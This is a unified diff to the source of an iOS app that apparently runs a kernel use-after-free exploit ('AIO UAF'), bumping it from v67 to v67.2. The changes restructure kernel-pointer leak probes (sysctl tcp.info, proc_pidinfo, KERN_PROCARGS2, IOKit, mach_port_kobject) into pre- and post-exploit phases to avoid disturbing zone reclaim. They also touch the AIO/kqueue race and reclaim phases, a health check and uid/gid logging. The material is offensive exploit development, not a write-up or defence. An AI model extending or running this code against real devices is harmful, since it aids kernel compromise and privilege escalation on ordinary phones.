@@ -254,9 +254,9 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v67.1: hotfix — remove PID 0 query (dangerous), shrink buffers (zone-safe). v67
-// crashed at FAR=0x58: proc_pidinfo on kernel_task disturbed AIO zone magazines,
-// causing reclaimed entry to have NULL procp during filt_aioprocess TAILQ_REMOVE.
+// v67.2: v67.1 + restructured Phase 0/D. All heavy probes (proc_pidinfo, KERN_PROCARGS2,
+// IOKit, mach_port_kobject) moved to post-exploit Phase D — they disturb AIO zone
+// magazines and break LIFO reclaim. Phase 0 is now minimal (sysctl TCP only).
 // independent leak channels: (A) sysctl tcp.info, (B) proc_pidinfo,
 // (C) non-FastPath IOKit enumeration, (D) mach_port_kobject. Each probe
 // dumps its full return buffer and scans for 0xFFFFFE/0xFFFFFF patterns.
@@ -589,7 +589,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v67" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v67.2" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5957,7 +5957,7 @@ static void *e2_free_and_ool_racer(void *arg) {
 
 #pragma mark - Phase 0: Multi-Vector Kernel Pointer Probe
 
-// v67 Phase 0: Multi-vector probe for kernel pointer leaks.
+// v67.2 Phase 0/D: Light pre-exploit probe + full post-exploit leak probe.
 // Tests four independent channels; each is non-destructive and
 // failure in one does not block the others.
 
@@ -6294,39 +6294,35 @@ static void *e2_free_and_ool_racer(void *arg) {
     }
 }
 
-- (NSDictionary *)runPhase0MultiVectorProbe {
-    NSMutableDictionary *result = [NSMutableDictionary dictionary];
-    result[@"success"] = @YES;
-
-    [self appendLog:@"\n=== Phase 0 v67: Multi-Vector Kernel Pointer Probe ==="];
-
-    // A: sysctl net.inet.tcp.info (CVE-2026-28867)
-    [self appendLog:@"\n-- Phase0.A: sysctl net.inet.tcp.info --"];
+// Phase 0 (pre-exploit): MINIMAL — just sysctl TCP info, no zone-disturbing allocs
+- (void)runPhase0LightProbe {
+    [self appendLog:@"\n=== Phase 0 v67.2: Light Pre-Exploit Probe ==="];
+    [self appendLog:@"\n-- Phase0: sysctl net.inet.tcp.info --"];
     @try { [self subtestSysctlTcpInfo]; }
-    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.A exception: %@", e]]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0 exception: %@", e]]; }
+}
 
-    // B: proc_pidinfo — exhaustive flavor×PID scan
-    [self appendLog:@"\n-- Phase0.B: proc_pidinfo (all flavors x 3 PIDs) --"];
+// Phase D (post-exploit): FULL leak probe — safe to run after exploit succeeds
+- (void)runPostExploitLeakProbe {
+    [self appendLog:@"\n=== Phase D v67.2: Post-Exploit Full Leak Probe ==="];
+
+    [self appendLog:@"\n-- PhaseD.B: proc_pidinfo scan --"];
     @try { [self subtestProcPidinfo]; }
-    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.B exception: %@", e]]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.B exception: %@", e]]; }
 
-    // B2: KERN_PROCARGS2 — known uninitialized kernel memory leak vector
-    [self appendLog:@"\n-- Phase0.B2: KERN_PROCARGS2 --"];
+    [self appendLog:@"\n-- PhaseD.B2: KERN_PROCARGS2 --"];
     @try { [self subtestKernProcargs]; }
-    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.B2 exception: %@", e]]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.B2 exception: %@", e]]; }
 
-    // C: IOKit enumeration
-    [self appendLog:@"\n-- Phase0.C: IOKit enumeration --"];
+    [self appendLog:@"\n-- PhaseD.C: IOKit enumeration --"];
     @try { [self subtestIOKitEnumeration]; }
-    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.C exception: %@", e]]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.C exception: %@", e]]; }
 
-    // D: mach_port_kobject
-    [self appendLog:@"\n-- Phase0.D: mach_port_kobject --"];
+    [self appendLog:@"\n-- PhaseD.D: mach_port_kobject --"];
     @try { [self subtestMachPortKobject]; }
-    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.D exception: %@", e]]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.D exception: %@", e]]; }
 
-    [self appendLog:@"\n=== Phase 0 Complete ==="];
-    return result;
+    [self appendLog:@"\n=== Post-Exploit Leak Probe Complete ==="];
 }
 
 - (void)aioUafTapped {
@@ -6349,14 +6345,11 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v67 (Multi-Vector Phase 0 + Dual-Knote) =========="];
+    [self appendLog:@"\n========== AIO UAF v67.2 (Light Phase 0 + Dual-Knote + Phase D) =========="];
 
-    // ---- Phase 0 v67: Multi-vector kernel pointer probe ----
-    [self appendLog:@"\n--- Phase 0 v67: Multi-vector kernel pointer probe ---"];
-    NSDictionary *fpResult = [self runPhase0MultiVectorProbe];
-    [self appendLog:[NSString stringWithFormat:@"Phase0 result: success=%@ copyEventOk=%@ uniquePtrs=%lu",
-                     fpResult[@"success"], fpResult[@"copyEventOk"],
-                     (unsigned long)[fpResult[@"kernelPointers"] count]]];
+    // ---- Phase 0 v67.2: Minimal pre-exploit probe (zone-safe) ----
+    [self appendLog:@"\n--- Phase 0 v67.2: Light pre-exploit probe ---"];
+    [self runPhase0LightProbe];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -6368,19 +6361,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v67: Diagnostic in Documents (persists across kernel panic / reboot)
+    // diag persists across kernel panic / reboot
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v67.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v67.2.txt"];
     unlink(diagPath.UTF8String);
 
-    // v67: SINGLE file — all AIO ops use same fd
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v67.bin"];
+    // SINGLE file — all AIO ops use same fd
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v67.2.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v67" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v67.2" forState:UIControlStateNormal];
         });
         return;
     }
@@ -6394,8 +6387,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v67: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
-    [self appendLog:@"\n--- Phase A v67: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
+    // ---- Phase A v67.2: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
+    [self appendLog:@"\n--- Phase A v67.2: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6491,8 +6484,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v67: Health check ----
-    [self appendLog:@"\n--- Phase C v67: Health check ---"];
+    // ---- Phase C v67.2: Health check ----
+    [self appendLog:@"\n--- Phase C v67.2: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6514,15 +6507,18 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:[NSString stringWithFormat:@"  health check: %d/4 ok", hc_ok]];
     }
 
+    // ---- Phase D v67.2: Post-exploit full leak probe (zone-safe — exploit already done) ----
+    [self runPostExploitLeakProbe];
+
 cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v67 Complete =========="];
+    [self appendLog:@"========== AIO UAF v67.2 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v67" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v67.2" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
